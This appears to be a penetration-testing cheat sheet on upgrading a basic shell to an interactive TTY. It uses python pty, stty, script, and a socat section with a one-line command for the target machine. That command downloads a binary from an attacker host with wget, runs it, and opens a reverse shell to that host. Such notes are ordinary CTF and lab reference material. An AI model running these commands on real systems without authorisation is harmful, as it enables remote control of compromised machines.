---
title: "Upgrade Shell"
date: 2024-6-27
tags: ["shell", "python", "bash", "sh", "tty"]
---

---
### Upgrade Shell

#### Check installed binary

```bash
which sh
```

```bash
which bash
```

```bash
which python3
```

```bash
which python
```

<br>

---

### python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# Ctrl-Z to send the process to background, then
stty raw -echo; fg
```

```bash
# After fg, press enter again, then
export TERM=xterm-256color
```

<br>

---

### socat

[Download socat](https://github.com/3ndG4me/socat)

```bash
# Start a local http server
python3 -m http.server 80
```

```bash
# In our local Linux machine
socat file:`tty`,raw,echo=0 tcp-listen:1337
```

```bash
# In target machine
wget -q http://10.10.14.10/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.10:1337
```

```bash
# In our local Linux machine
export TERM=xterm-256color
```

<br>

---

### script

```bash
script -qc /bin/bash /dev/null
```

<br>